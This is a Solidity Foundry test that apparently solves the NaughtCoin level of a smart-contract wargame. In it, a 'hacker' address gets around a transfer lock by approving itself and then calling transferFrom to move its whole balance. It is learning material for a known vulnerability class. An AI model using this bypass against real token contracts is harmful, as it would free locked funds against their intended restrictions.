// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/15_NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public nc; 
    address public hacker = address(0x1337);

    function setUp() public {
        nc = new NaughtCoin(hacker);
    }

    function testExploit() public {
        uint256 balance = nc.balanceOf(hacker);
        
        vm.startPrank(hacker);

        nc.approve(hacker, balance);

        nc.transferFrom(hacker, address(0xdead), balance);

        vm.stopPrank();

        assertEq(nc.balanceOf(hacker), 0);
    }
}